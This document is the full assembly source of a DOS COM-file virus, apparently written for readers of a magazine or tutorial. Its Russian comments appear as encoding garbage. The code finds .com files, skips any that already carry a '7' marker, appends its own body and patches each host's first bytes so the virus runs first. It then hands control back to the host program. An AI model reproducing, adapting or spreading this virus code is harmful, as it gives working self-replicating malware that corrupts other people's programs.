    ; ________________________________________________
    ;|                                                |
    ;| Non - TSR COM virus                            |
    ;| Especially for my readers !                    |
    ;|________________________________________________|

    prg segment
       assume cs:prg,ds:prg,es:prg,ss:prg
          org 100h

    start:     jmp vir                ;��।�� �ࠢ-
                                      ;����� ����᭮��
                                      ;���� ...
               org 110h

    vir:       push ds                ;���࠭�� DS ...
                                      ;���४��㥬
               mov ax,ds              ;ॣ���� DS  ...
               db 05h                 ;��� �������
    add_to_ds: dw 0                   ; " ADD AX,00h "
               mov ds,ax              ;AX -> DS    ...

    fresh_bytes:
               mov al,old_bytes
               mov cs:[100h],al
               mov al,old_bytes+1
               mov cs:[101h],al
               mov al,old_bytes+2
               mov cs:[102h],al

               mov cx,80h             ;������ DTA -
                                      ;128 ���� ...
               mov bx,80h             ;���饭�� � DTA
               lea si,old_dta         ;���� ���ᨢ�
    save_dta:
               mov al,byte ptr cs:[bx];��⠥� �� DTA
                                      ;���� �  ��७�-
               mov ds:[si],al         ;ᨬ ��� � ���-
                                      ;ᨢ ...
               inc bx                 ;� ������ �����
               inc si                 ;
               loop save_dta          ;���� 128 ࠧ

    find_first:
               mov ah,4eh             ;���� ��ࢮ��
                                      ;䠩�� ...
               mov cx,00100110b       ;archive, system
                                      ;hidden
               lea dx,maska           ;��᪠ ��� ����-
                                      ;��
               int 21h
               jnc r_3                ;��諨 !
               jmp restore_dta        ;�訡�� !

    find_next: mov ah,3eh             ;���஥�  �����-
               int 21h                ;室�騩 䠩�...
               jnc r_2
               jmp restore_dta        ;���� ����� ��-
                                      ;����� !

    r_2:       mov ah,4fh             ;� ������ ᫥-
               int 21h                ;���騩 ...
               jnc r_3                ;���� ������ !
               jmp restore_dta        ;�訡�� !

    r_3:       mov cx,12              ;���६ � ����
               lea si,fn              ;"fn" ���  �।-
    destroy_name:                     ;��饣� 䠩��
               mov byte ptr [si],0    ;
               inc si                 ;
               loop destroy_name      ;���� 12 ࠧ ...

               xor si,si              ;� ����襬 � ��-
    copy_name: mov al,byte ptr cs:[si+9eh]
                                      ;�� ��� ⮫쪮
               cmp al,0               ;�� ����������
                                      ;䠩�� ...
               je open                ;� ���� ����� �
               mov byte ptr ds:fn[si],al
                                      ;DTA �ᥣ�� ��-
               inc si                 ;�� ����, ��� ��
               jmp copy_name          ;� �⨬ ������

    open:      mov ax,3d02h           ;������ 䠩�
                                      ;��� �⥭�� �
                                      ;����� ...
               lea dx,fn              ;��� 䠩�� ...
               int 21h                ;�㭪�� DOS
               jnc save_bytes
               jmp restore_dta        ;���� �� ����-
                                      ;������ !

    save_bytes:                       ;��⠥� ��
                                      ;���� :
               mov bx,ax              ;���࠭�� ���-
                                      ;�ਯ�� � BX
               mov ah,3fh             ;����� �㭪樨
               mov cx,3               ;����쪮 ���� ?
               lea dx,old_bytes       ;���� ��� ��-
                                      ;�뢠���� ������
               int 21h
               jnc found_size
               jmp close              ;�訡�� !

    found_size:
               mov ax,cs:[09ah]       ;������ ࠧ���
                                      ;䠩��
    count_size:mov si,ax
               cmp ax,64000           ;���� �������
                                      ;64000 ���� ?
               jna toto               ;��� ...
               jmp find_next          ;�� - ⮣�� ��
                                      ;��� �� ���室��
    toto:      test ax,000fh          ;���㣫�� ࠧ���
               jz krat_16             ;�� 楫��� �᫠
               or ax,000fh            ;��ࠣ�䮢    �
               inc ax                 ;������� ��஭�
    krat_16:   mov di,ax              ;�  ����襬  ��-
                                      ;�㣫�����  ���-
                                      ;祭�� � DI ...
                                      ;����⠥�  ᬥ-
                                      ;饭�� ��� ���-
                                      ;室� �� ��� ��-
                                      ;��� ...
               sub ax,3               ;����    �������
                                      ;���室�  ����-
                                      ;���� �� ����!
               mov byte ptr new_bytes[1],al
                                      ;���饭�� �����-
               mov byte ptr new_bytes[2],ah
                                      ;�� !
               mov ax,di              ;����쪮   ���-
               mov cl,4               ;��䮢 ᮤ�ন�
               shr ax,cl              ;��ࠦ����� ��-
                                      ;�ࠬ�� ?
               dec ax                 ;���뢠�� ����-
                                      ;⢨� ��४⨢�
                                      ;ORG 110h ...
               mov byte ptr add_to_ds,al
                                      ;���४����饥
               mov byte ptr add_to_ds+1,ah
                                      ;�᫮ ������� !

               mov ax,4200h           ;��⠭���� 㪠-
               xor cx,cx              ;��⥫� �� ���-
               dec si                 ;������ ����
               mov dx,si              ;䠩�� ...
               int 21h
               jnc read_last
               jmp close              ;�訡�� !

    read_last:                        ;� ��⠥� ���
               mov ah,3fh             ;���� � �祩��
               mov cx,1               ; " last " ...
               lea dx,last
               int 21h
               jc close               ;�訡�� !

               cmp last,'7'           ;" last " =" 7 "
               jne write_vir          ;��� - �����
               jmp find_next          ;��- ���饬 ���-
                                      ;��� 䠩� ...

    write_vir: mov ax,4200h           ;��⠭����  㪠-
               xor cx,cx              ;��⥫� �� �����
               mov dx,di              ;䠩�� ...
               int 21h
               jc close               ;�� �訡�� -
                                      ;���஥� 䠩�
               mov ah,40h             ;����襬  � 䠩�
               mov cx,vir_len         ;��� ����� ���-
               lea dx,vir             ;��� vir_len
               int 21h
               jc close               ;�� �訡�� -
                                      ;���஥� 䠩�
    write_bytes:
               mov ax,4200h           ;��⠭����  㪠-
               xor cx,cx              ;��⥫� �� ���-
               xor dx,dx              ;�� 䠩��
               int 21h
               jc close               ;�� �訡�� -
                                      ;���஥� 䠩�

               mov ah,40h             ;����襬 �  䠩�
               mov cx,3               ;���� �� ���-
               lea dx,new_bytes       ;� ( �������
               int 21h                ;���室� ) ...

    close:     mov ah,3eh             ;���஥�   ���-
               int 21h                ;����� 䠩� ...

    restore_dta:
               mov cx,80h             ;������ DTA -
                                      ;128 ���� ...
               mov bx,80h             ;���饭�� � DTA
               lea si,old_dta         ;���� ���ᨢ�
    dta_fresh:
               mov al,ds:[si]         ;��⠥� ��  ���-
                                      ;ᨢ� "old_dta"
               mov byte ptr cs:[bx],al;���� �  ��७�-
                                      ;ᨬ ��� � DTA
               inc bx                 ;� ������ �����
               inc si                 ;
               loop dta_fresh         ;���� 128 ࠧ

               pop ds                 ;����⠭����
                                      ;�ᯮ�祭�� DS
               push cs                ;����ᥬ � �⥪
                                      ;ॣ���� CS
               db 0b8h                ;��� �������
    jump:      dw 100h                ;mov ax,100h
               push ax                ;����ᥬ � �⥪
                                      ;�᫮ 100h
               retf                   ;��।�� �ࠢ-
                                      ;����� �� �����-
                                      ;�� ���� ...

    ;\*Data area ...

    old_bytes db   0e9h               ;��室�� ��
                                      ;����  ��ࠦ��-
              dw   vir_len + 0dh      ;��� �ணࠬ��

    old_dta   db   128 dup (0)        ;����� �����
                                      ;�࠭�� ��室���
                                      ;DTA �ணࠬ��
    maska     db   '*.com',0          ;��᪠ ��� ����-
                                      ;�� 䠩��� ...
    fn        db   12 dup (' '),0     ;� ����頥���
                                      ;��� 䠩�� -���-
                                      ;�� ...
    new_bytes db   0e9h               ;���� �� ���-
              db   00h                ;� ����� �
              db   00h                ;䠩�� ...

    last      db   0                  ;�祩�� ��� ���-
                                      ;������� ����
              db   '7'                ;��᫥���� ����
                                      ;����� � 䠩��

    vir_len   equ   $-vir             ;����� ����᭮��
                                      ;���� ...

    prg_end:   mov ah,4ch             ;�����襭��  ��-
               INT 21H                ;��᪠�饩 �ண-
                                      ;ࠬ�� ...

              db '7'                  ;��� �⮣�  ᨬ-
                                      ;���� �����  ��-
                                      ;ࠧ�� �� ᠬ
                                      ;ᥡ� ...

    prg ends                          ;�� ASM - �ண-
    end start                         ;ࠬ��  ������-
                                      ;������ �ਬ�୮
                                      ;⠪ .
